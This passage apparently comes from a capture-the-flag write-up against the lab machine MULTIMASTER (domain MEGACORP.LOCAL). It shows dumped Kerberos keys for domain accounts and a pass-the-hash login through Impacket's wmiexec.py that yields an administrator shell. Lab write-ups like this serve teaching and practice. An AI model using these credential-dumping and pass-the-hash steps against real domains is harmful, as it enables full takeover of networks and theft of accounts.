krbtgt:aes128-cts-hmac-sha1-96:8265ceeb32d72dc693156c1243f79563
krbtgt:des-cbc-md5:ef8cab25086df10d
MEGACORP.LOCAL\svc-nas:aes256-cts-hmac-sha1-96:9a4d8f1e91a3217a75128299598c7d888443d1dd6020b92c95340ff3dceed0c1
MEGACORP.LOCAL\svc-nas:aes128-cts-hmac-sha1-96:6601c77c6b491e192223a1e8fea444a9
MEGACORP.LOCAL\svc-nas:des-cbc-md5:c17a52d35babcb4a
MEGACORP.LOCAL\tushikikatomo:aes256-cts-hmac-sha1-96:a17e831cc83fb0b985df7a222f8ccf7d2ee4d855331cb6fb26d47f20010405d3
MEGACORP.LOCAL\tushikikatomo:aes128-cts-hmac-sha1-96:ce39dfd4ee60206e02ee542566bf1d17
MEGACORP.LOCAL\tushikikatomo:des-cbc-md5:a49ea116df7a8668
MEGACORP.LOCAL\andrew:aes256-cts-hmac-sha1-96:c25a2c9729cc589c1105a7ea3f97fd5bb95ac1bf7c3f43fa2219f69282c4c392
MEGACORP.LOCAL\andrew:aes128-cts-hmac-sha1-96:e762d814d6bc915ed18f7785c3493131
MEGACORP.LOCAL\andrew:des-cbc-md5:1cf7e0dc8c133ea8
MEGACORP.LOCAL\lana:aes256-cts-hmac-sha1-96:8f40c6dd1bd6d392b5ec361ee5f5370da0ab77d21883d1cf7aa2f0522c152837
MEGACORP.LOCAL\lana:aes128-cts-hmac-sha1-96:02c50a665fbe3ed69ae65c61f039e93b
MEGACORP.LOCAL\lana:des-cbc-md5:b9e95eefd952dc5e
MEGACORP.LOCAL\alice:aes256-cts-hmac-sha1-96:572b78f3faccbc392b63179f36910cf134ac7bac3ccf3f333f13460bc8b22662
MEGACORP.LOCAL\alice:aes128-cts-hmac-sha1-96:7e393b4520ffff00635e6efc539e9a7e
MEGACORP.LOCAL\alice:des-cbc-md5:04ae08e037cbe6e6
MEGACORP.LOCAL\dai:aes256-cts-hmac-sha1-96:2a0c78927c95c9431ad228e9541aa3faf8b43bfd0386ebe10946b7c5ac97bdeb
MEGACORP.LOCAL\dai:aes128-cts-hmac-sha1-96:230262301df41adcdb81b9906d3920b5
MEGACORP.LOCAL\dai:des-cbc-md5:765298e319237ad0
MEGACORP.LOCAL\svc-sql:aes256-cts-hmac-sha1-96:54760b83091aaccf79769d09f6357e9049de311369801625f07ce2788d03096e
MEGACORP.LOCAL\svc-sql:aes128-cts-hmac-sha1-96:490c9502ebbcc5fcbdf94e3dbbdfabf6
MEGACORP.LOCAL\svc-sql:des-cbc-md5:70b3daf4d902582c
MEGACORP.LOCAL\sbauer:aes256-cts-hmac-sha1-96:510973978e1825f06d42a1d7d72131cda4394ff463daa0e6f1a7c45f4f815ba0
MEGACORP.LOCAL\sbauer:aes128-cts-hmac-sha1-96:d2cd10986be29f29eeacd7aec880c913
MEGACORP.LOCAL\sbauer:des-cbc-md5:df0b792ab9913ef1
MEGACORP.LOCAL\okent:aes256-cts-hmac-sha1-96:73c1cde578ce842b2601b4f306a196a6e0dcf6f77aee89a361e17f7db1cc88c3
MEGACORP.LOCAL\okent:aes128-cts-hmac-sha1-96:b10a5f5891e7490659363e6b18c4ec2e
MEGACORP.LOCAL\okent:des-cbc-md5:e9e045bf0b7c3d6d
MEGACORP.LOCAL\ckane:aes256-cts-hmac-sha1-96:47e28dae2b80f58d6b0e0bbdc82c0347b54b6ab5a59c98f3277491fb2d338b22
MEGACORP.LOCAL\ckane:aes128-cts-hmac-sha1-96:ca968d05cd4a3d1aef15e113762c5b08
MEGACORP.LOCAL\ckane:des-cbc-md5:89e967b9d531f8fd
MEGACORP.LOCAL\kpage:aes256-cts-hmac-sha1-96:014431689980a6d80093bf92e7ec747e46adc3e5c130a616d121b7eca481fa6a
MEGACORP.LOCAL\kpage:aes128-cts-hmac-sha1-96:dd1113113ee2343c7613feb9721ff74a
MEGACORP.LOCAL\kpage:des-cbc-md5:5b5207f72c5d1320
MEGACORP.LOCAL\james:aes256-cts-hmac-sha1-96:54fcf58bc4d39096952f9b366a9c0d27f836b3140d91583cefdb81116e471d06
MEGACORP.LOCAL\james:aes128-cts-hmac-sha1-96:6257b8a8253e75664db277427ad7dc47
MEGACORP.LOCAL\james:des-cbc-md5:ce26230701e089ab
MEGACORP.LOCAL\cyork:aes256-cts-hmac-sha1-96:dbdcfc44a72f4c976acec9cd15bb594989634ade78a683a37d5174e3c6b3a550
MEGACORP.LOCAL\cyork:aes128-cts-hmac-sha1-96:9bf3e36f39c149c5b3dbfda949d9f61f
MEGACORP.LOCAL\cyork:des-cbc-md5:a7f491314f70430e
MEGACORP.LOCAL\rmartin:aes256-cts-hmac-sha1-96:cdee6c93315215536b47099517aaf379480f5ad6f27484512abfd286ad453b35
MEGACORP.LOCAL\rmartin:aes128-cts-hmac-sha1-96:ad4331926678013c0d10d94a43c7d8b4
MEGACORP.LOCAL\rmartin:des-cbc-md5:6b463885c28fc1ea
MEGACORP.LOCAL\zac:aes256-cts-hmac-sha1-96:5ee2033f1aef639d295c6bd85710c86b63c421b9b2982fe7956fa5a9d9f91e1b
MEGACORP.LOCAL\zac:aes128-cts-hmac-sha1-96:7c0830f5c24a978966040f1d4ba2a54b
MEGACORP.LOCAL\zac:des-cbc-md5:c2fe40f449ef6713
MEGACORP.LOCAL\jorden:aes256-cts-hmac-sha1-96:538d6436d2446bd3add5e196d7dd7ccc07bc274bec6fa8e3b58c4f6ad0080873
MEGACORP.LOCAL\jorden:aes128-cts-hmac-sha1-96:95f6e97795cfe39d41f292ca05aad9dc
MEGACORP.LOCAL\jorden:des-cbc-md5:4576891aae9beff1
MEGACORP.LOCAL\alyx:aes256-cts-hmac-sha1-96:2813dbd8e4a8505747c0d024ddaf26bdb81bed46d3fd06c686c836a4995e8baf
MEGACORP.LOCAL\alyx:aes128-cts-hmac-sha1-96:b7f01ebc755d5b4f0e490291f1258475
MEGACORP.LOCAL\alyx:des-cbc-md5:31798513ae807fe5
MEGACORP.LOCAL\ilee:aes256-cts-hmac-sha1-96:d11ec507be904edcf375a5b448b2ba38b6e4b110ee7bf2ee839cf18a0879d353
MEGACORP.LOCAL\ilee:aes128-cts-hmac-sha1-96:7441bd13486a990a24410504f7b5b45e
MEGACORP.LOCAL\ilee:des-cbc-md5:6d758f19674ff192
MEGACORP.LOCAL\nbourne:aes256-cts-hmac-sha1-96:309803ce49001b289cebe3098ea626a6f181d4f6a4c82f16c7075839ff865a97
MEGACORP.LOCAL\nbourne:aes128-cts-hmac-sha1-96:afd355fd0695835244d50e494b91a551
MEGACORP.LOCAL\nbourne:des-cbc-md5:dc385d1a83912008
MEGACORP.LOCAL\zpowers:aes256-cts-hmac-sha1-96:180e9050590393d1e1e5b7a5d2f971eb5ebc99306ae57806f949a477dc32a7bc
MEGACORP.LOCAL\zpowers:aes128-cts-hmac-sha1-96:eb02dd1db27233dbadc106ddfb82ec1c
MEGACORP.LOCAL\zpowers:des-cbc-md5:7976f2138083160e
MEGACORP.LOCAL\aldom:aes256-cts-hmac-sha1-96:1490c171e00ce0460fba0314aa8ff359a82c6ac2c2713c85160ccae578299a1b
MEGACORP.LOCAL\aldom:aes128-cts-hmac-sha1-96:53a9a2c24bd67e3361b2d9efe92037a6
MEGACORP.LOCAL\aldom:des-cbc-md5:8fcb54e53e2f261f
MEGACORP.LOCAL\jsmmons:aes256-cts-hmac-sha1-96:06e3cc359533ecb2f582108082530997500073035c01643a7fea7cba851f471b
MEGACORP.LOCAL\jsmmons:aes128-cts-hmac-sha1-96:94410da2abdf4e963859e62846bac102
MEGACORP.LOCAL\jsmmons:des-cbc-md5:bf522ab36d315b49
MEGACORP.LOCAL\pmartin:aes256-cts-hmac-sha1-96:356a94ed6163d042d9d87b28aa327031c59f5f76aa837fd68429ee1f21baaa9c
MEGACORP.LOCAL\pmartin:aes128-cts-hmac-sha1-96:6ac67d30242db1e246c84467ccae3173
MEGACORP.LOCAL\pmartin:des-cbc-md5:cdcda7c44970f445
MULTIMASTER$:aes256-cts-hmac-sha1-96:b76bd99f213d43704c64506e92700c881cdd4ab484a98e3c0a64fe190c7ce725
MULTIMASTER$:aes128-cts-hmac-sha1-96:2e3f83637a857711f71236649844b048
MULTIMASTER$:des-cbc-md5:fb9d1cd3343276f4
[*] Cleaning up... 
```

```
┌──(venv)─(root㉿kali)-[~/Desktop/impacket]
└─# wmiexec.py MEGACORP.LOCAL/administrator@10.129.95.200 -hashes aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami 
megacorp\administrator

C:\>

```

![Pasted image 20260515155833.png](/ob/Pasted%20image%2020260515155833.png)
